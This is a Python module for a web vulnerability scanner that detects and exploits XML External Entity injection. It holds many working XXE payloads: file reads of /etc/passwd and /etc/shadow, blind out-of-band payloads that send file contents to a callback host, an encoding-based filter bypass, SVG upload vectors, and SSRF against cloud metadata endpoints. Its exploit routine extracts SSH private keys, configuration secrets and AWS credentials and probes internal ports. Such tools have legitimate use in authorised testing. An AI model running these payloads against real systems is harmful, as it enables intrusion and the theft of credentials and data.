import re
import asyncio
from urllib.parse import urlparse
from modules.base import BaseModule
from core.utils import random_string


class XxeModule(BaseModule):
    name = "xxe"
    description = "XML External Entity Injection Scanner"
    exploitable = True
    
    success_patterns = [
        r"root:.*:0:0:",
        r"\[extensions\]",
        r"\[boot loader\]",
        r"daemon:.*:1:1:",
        r"www-data:",
        r"nobody:",
    ]
    
    files_to_read = [
        ("/etc/passwd", "linux"),
        ("/etc/shadow", "linux"),
        ("/etc/hosts", "linux"),
        ("c:/windows/win.ini", "windows"),
        ("c:/windows/system32/drivers/etc/hosts", "windows"),
        ("file:///proc/self/environ", "linux"),
    ]
    
    async def scan(self, target):
        self.findings = []
        self.oob_manager = self.config.get("oob_manager")
        callback_host = self.config.get("callback_host")
        
        await self._test_basic_xxe(target)
        await self._test_parameter_entity(target)
        await self._test_xxe_ssrf(target)
        
        if self.oob_manager:
            await self._test_blind_xxe_oob(target)
        elif callback_host:
            await self._test_oob_xxe(target, callback_host)
            await self._test_oob_data_exfil(target, callback_host)
        
        await self._test_xinclude(target)
        await self._test_svg_xxe(target)
        
        if self.aggressive:
            await self._test_xxe_error_based(target)
            await self._test_utf_encoding_bypass(target)
        
        return self.findings
    
    async def _test_blind_xxe_oob(self, target):
        token = self.oob_manager.generate_token()
        http_callback = self.oob_manager.get_http_url(token)
        dns_callback = self.oob_manager.get_dns_payload(token)
        
        blind_payloads = [
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{http_callback}">
  %xxe;
]><foo>test</foo>''',
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{http_callback}">
]><foo>&xxe;</foo>''',
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{dns_callback}/">
  %xxe;
]><foo>test</foo>''',
            f'''<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "{http_callback}">
<foo>test</foo>''',
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{http_callback}/?d=%file;'>">
  %eval;
  %exfil;
]><foo>test</foo>''',
        ]
        
        for payload in blind_payloads:
            await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
        
        await asyncio.sleep(3)
        
        interactions = self.oob_manager.check_interactions(token)
        if interactions:
            interaction_type = interactions[0].get("type", "unknown")
            self.add_finding(
                "CRITICAL",
                f"Blind XXE CONFIRMED via OOB ({interaction_type})",
                url=target,
                evidence=f"Callback received: {interactions[0]}",
                confidence_evidence=["oob_callback_received", "blind_xxe_confirmed"],
                request_data={"method": "POST", "url": target, "content_type": "application/xml"}
            )
            return True
        return False
    
    async def _test_xxe_error_based(self, target):
        error_payloads = [
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]><foo>test</foo>''',
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://x]%file;'>">
  %eval;
  %exfil;
]><foo>test</foo>''',
        ]
        
        for payload in error_payloads:
            resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
            if resp.get("status"):
                text = resp.get("text", "")
                for pattern in self.success_patterns:
                    if re.search(pattern, text, re.IGNORECASE):
                        self.add_finding(
                            "CRITICAL",
                            "XXE Error-based Data Extraction",
                            url=target,
                            evidence=f"File content leaked in error message",
                            confidence_evidence=["error_based_xxe", "data_in_error"],
                            request_data={"method": "POST", "url": target, "payload": "error-based"}
                        )
                        return
    
    async def _test_utf_encoding_bypass(self, target):
        utf16_payload = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'''
        
        utf7_payload = '''<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo +AFs-+ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4AXQ-+AD4-
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4-'''
        
        for payload, encoding in [(utf16_payload, "UTF-16"), (utf7_payload, "UTF-7")]:
            resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
            if resp.get("status"):
                for pattern in self.success_patterns:
                    if re.search(pattern, resp.get("text", ""), re.IGNORECASE):
                        self.add_finding(
                            "CRITICAL",
                            f"XXE via {encoding} Encoding Bypass",
                            url=target,
                            evidence="WAF bypass using alternate encoding",
                            confidence_evidence=["encoding_bypass", "xxe_confirmed"]
                        )
                        return
    
    async def _test_basic_xxe(self, target):
        for file_path, os_type in self.files_to_read[:3]:
            payloads = [
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_path}">]><foo>&xxe;</foo>',
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{file_path}">]><foo>&xxe;</foo>',
                f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY file SYSTEM "file://{file_path}">]><data>&file;</data>',
            ]
            
            for payload in payloads:
                resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
                
                if resp.get("status"):
                    for pattern in self.success_patterns:
                        if re.search(pattern, resp["text"], re.IGNORECASE):
                            extracted = self._extract_file_content(resp["text"])
                            self.add_finding(
                                "CRITICAL",
                                f"XXE File Disclosure ({file_path})",
                                url=target,
                                evidence=f"Extracted: {extracted[:200]}",
                                confidence_evidence=["file_content_extracted", f"{os_type}_file_pattern"],
                                request_data={"method": "POST", "url": target, "payload": payload[:100]}
                            )
                            return
    
    async def _test_parameter_entity(self, target):
        marker = random_string(8)
        
        payloads = [
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///etc/passwd'>">
  %eval;
  %exfil;
]><foo>test</foo>''',
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % aaa SYSTEM "file:///etc/passwd">
  <!ENTITY % bbb "<!ENTITY ccc SYSTEM 'file:///etc/passwd'>">
]><foo>&ccc;</foo>''',
        ]
        
        for payload in payloads:
            resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
            
            if resp.get("status"):
                for pattern in self.success_patterns:
                    if re.search(pattern, resp.get("text", ""), re.IGNORECASE):
                        self.add_finding(
                            "CRITICAL",
                            "XXE via Parameter Entity",
                            url=target,
                            evidence="Parameter entity expansion successful"
                        )
                        return
    
    async def _test_xxe_ssrf(self, target):
        cloud_endpoints = [
            ("http://169.254.169.254/latest/meta-data/", "AWS"),
            ("http://169.254.169.254/computeMetadata/v1/", "GCP"),
            ("http://169.254.169.254/metadata/instance", "Azure"),
            ("http://100.100.100.200/latest/meta-data/", "Alibaba"),
        ]
        
        for endpoint, cloud in cloud_endpoints:
            payload = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{endpoint}">]><foo>&xxe;</foo>'
            
            resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
            
            if resp.get("status") == 200:
                indicators = ["ami-id", "instance-id", "hostname", "local-ipv4", "iam", "security-credentials"]
                for indicator in indicators:
                    if indicator in resp.get("text", ""):
                        self.add_finding(
                            "CRITICAL",
                            f"XXE to SSRF - {cloud} Metadata Access",
                            url=target,
                            evidence=f"Cloud metadata accessible: {indicator}"
                        )
                        return
    
    async def _test_oob_xxe(self, target, callback_host):
        marker = random_string(12)
        
        payloads = [
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{marker}.xxe.{callback_host}/">
  %xxe;
]><foo>test</foo>''',
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{marker}.xxe.{callback_host}/">
]><foo>&xxe;</foo>''',
            f'''<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://{marker}.xxe.{callback_host}/evil.dtd">
<foo>test</foo>''',
        ]
        
        for payload in payloads:
            await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
        
        self.add_finding(
            "INFO",
            "OOB XXE payloads sent",
            url=target,
            evidence=f"Check {callback_host} for DNS/HTTP callback from {marker}.xxe.*"
        )
    
    async def _test_oob_data_exfil(self, target, callback_host):
        marker = random_string(12)
        
        dtd_payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://{marker}.dtd.{callback_host}/exfil.dtd">
  %dtd;
  %send;
]><foo>test</foo>'''
        
        await self.http.post(target, data=dtd_payload, headers={"Content-Type": "application/xml"})
        
        php_filter_payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://{marker}.php.{callback_host}/exfil.dtd">
  %dtd;
]><foo>test</foo>'''
        
        await self.http.post(target, data=php_filter_payload, headers={"Content-Type": "application/xml"})
        
        self.add_finding(
            "INFO",
            "OOB XXE Data Exfil payloads sent",
            url=target,
            evidence=f"Check {callback_host} for exfiltrated data via {marker}.*"
        )
    
    async def _test_xinclude(self, target):
        payload = '''<?xml version="1.0"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>'''
        
        resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
        
        if resp.get("status"):
            for pattern in self.success_patterns:
                if re.search(pattern, resp.get("text", ""), re.IGNORECASE):
                    self.add_finding(
                        "CRITICAL",
                        "XXE via XInclude",
                        url=target,
                        evidence="XInclude file inclusion successful"
                    )
                    return
    
    async def _test_svg_xxe(self, target):
        svg_payload = '''<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>'''
        
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        upload_endpoints = [target, f"{base_url}/upload", f"{base_url}/api/upload", f"{base_url}/file/upload"]
        
        for endpoint in upload_endpoints:
            resp = await self.http.post(
                endpoint,
                data=svg_payload,
                headers={"Content-Type": "image/svg+xml"}
            )
            
            if resp.get("status"):
                for pattern in self.success_patterns:
                    if re.search(pattern, resp.get("text", ""), re.IGNORECASE):
                        self.add_finding(
                            "CRITICAL",
                            "XXE via SVG Upload",
                            url=endpoint,
                            evidence="SVG XXE exploitation successful"
                        )
                        return
    
    async def _test_docx_xxe(self, target):
        self.add_finding(
            "INFO",
            "DOCX XXE test requires file upload",
            url=target,
            evidence="Inject XXE in document.xml within DOCX/XLSX/PPTX files"
        )
    
    def _extract_file_content(self, text):
        for pattern in self.success_patterns:
            match = re.search(pattern, text)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(text), match.end() + 200)
                return text[start:end].strip()
        return text[:200]
    
    async def exploit(self, target, finding):
        extracted = {"files": {}, "cloud_metadata": {}, "internal_hosts": []}
        
        sensitive_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/root/.ssh/id_rsa",
            "/root/.bash_history",
            "/var/www/html/.env",
            "/var/www/html/config.php",
            "/var/www/html/wp-config.php",
            "c:/windows/win.ini",
            "c:/inetpub/wwwroot/web.config",
        ]
        
        for filepath in sensitive_files:
            payloads = [
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{filepath}">]><foo>&xxe;</foo>',
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{filepath}">]><foo>&xxe;</foo>',
            ]
            
            for payload in payloads:
                resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
                if resp.get("status") == 200 and resp.get("text"):
                    text = resp["text"]
                    if any(re.search(p, text, re.IGNORECASE) for p in self.success_patterns):
                        content = self._extract_file_content(text)
                        extracted["files"][filepath] = content
                        self.add_finding(
                            "CRITICAL",
                            f"XXE EXPLOITED: File exfiltrated - {filepath}",
                            url=target,
                            evidence=content[:300]
                        )
                        break
                    elif "DB_PASSWORD" in text or "SECRET_KEY" in text or "password" in text.lower():
                        extracted["files"][filepath] = text[:2000]
                        self.add_finding(
                            "CRITICAL",
                            f"XXE EXPLOITED: Config file extracted - {filepath}",
                            url=target,
                            evidence=text[:300]
                        )
                        break
        
        aws_endpoints = [
            "/latest/meta-data/",
            "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/hostname",
            "/latest/user-data/",
        ]
        
        for endpoint in aws_endpoints:
            url = f"http://169.254.169.254{endpoint}"
            payload = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]><foo>&xxe;</foo>'
            
            resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
            if resp.get("status") == 200 and resp.get("text"):
                text = resp["text"]
                if "ami-" in text or "instance-id" in text or "AccessKeyId" in text:
                    extracted["cloud_metadata"][endpoint] = text[:1000]
                    self.add_finding(
                        "CRITICAL",
                        f"XXE EXPLOITED: AWS metadata extracted - {endpoint}",
                        url=target,
                        evidence=text[:300]
                    )
        
        internal_hosts = ["127.0.0.1", "localhost", "10.0.0.1", "192.168.1.1", "172.16.0.1"]
        ports = [80, 8080, 3306, 5432, 6379, 9200]
        
        for host in internal_hosts:
            for port in ports:
                payload = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{host}:{port}/">]><foo>&xxe;</foo>'
                
                resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
                if resp.get("status") == 200 and len(resp.get("text", "")) > 100:
                    extracted["internal_hosts"].append({
                        "host": host,
                        "port": port,
                        "response_size": len(resp["text"])
                    })
        
        if extracted["files"] or extracted["cloud_metadata"] or extracted["internal_hosts"]:
            self.exploited_data = extracted
            return extracted
        
        return None